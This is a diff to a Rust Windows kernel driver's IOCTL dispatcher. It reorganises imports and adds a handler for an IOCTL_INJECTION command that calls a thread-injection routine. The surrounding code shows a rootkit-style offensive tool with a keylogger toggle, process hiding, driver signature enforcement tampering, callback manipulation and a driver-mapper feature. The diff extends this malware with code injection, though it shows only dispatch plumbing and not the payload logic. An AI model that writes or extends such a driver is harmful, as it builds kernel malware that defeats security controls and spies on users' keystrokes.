@@ -1,24 +1,20 @@
 use {
     crate::{
-        driver::Driver, handle_driver, handle_process,
-        handle_callback, handle_thread, keylogger::set_keylogger_state, 
-        process::Process, thread::Thread, callbacks::Callback,
-        handle_module, module::Module
+        callbacks::Callback, driver::Driver, 
+        handle_callback, handle_driver, handle_injection, 
+        handle_module, handle_process, handle_thread, 
+        keylogger::set_keylogger_state, module::Module, 
+        process::Process, thread::Thread, injection::Injection
     }, 
     alloc::boxed::Box, 
     core::mem::size_of, 
     hashbrown::HashMap, 
     lazy_static::lazy_static, 
+    wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS},
     shared::{
         ioctls::*, 
-        structs::{
-            DriverInfo, TargetDriver, EnumerateInfoInput, Keylogger, 
-            ProcessInfoHide, ProcessListInfo, ProcessSignature, TargetProcess, 
-            TargetThread, ThreadListInfo, DSE, CallbackInfoOutput, CallbackInfoInput,
-            ModuleInfo
-        }
+        structs::*,
     }, 
-    wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS}
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -144,6 +140,13 @@ lazy_static! {
             let mut information = 0;
             let status = unsafe { handle_module!(irp, stack, Module::enumerate_module, TargetProcess, ModuleInfo, &mut information) };
             unsafe { (*irp).IoStatus.Information = information as u64 };
+            status
+        }) as IoctlHandler);
+
+        ioctls.insert(IOCTL_INJECTION, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION");
+            let status = unsafe { handle_injection!(stack, Injection::injection_thread, TargetInjection) };
+            unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
 
